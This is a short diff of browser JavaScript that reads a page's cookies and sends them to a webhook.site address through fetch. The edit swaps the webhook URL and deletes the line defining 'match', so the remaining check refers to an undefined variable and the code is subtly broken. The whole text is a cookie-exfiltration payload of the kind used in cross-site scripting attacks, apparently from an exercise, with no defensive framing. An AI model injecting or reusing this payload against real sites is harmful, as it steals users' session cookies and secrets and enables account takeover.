@@ -1,6 +1,5 @@
 var cookies = document.cookie;
-var match = cookies.match(/SECRET=([^;]+)/);
 if(match) {
     // Send to webhook
-    fetch('https://webhook.site/ce3b5ec9-fcef-4795-a1c1-b106802104ba?secret=' + cookies);
+    fetch('https://webhook.site/04e02681-01c6-43b0-adf8-8b311acc9b60/?secret=' + cookies);
 }
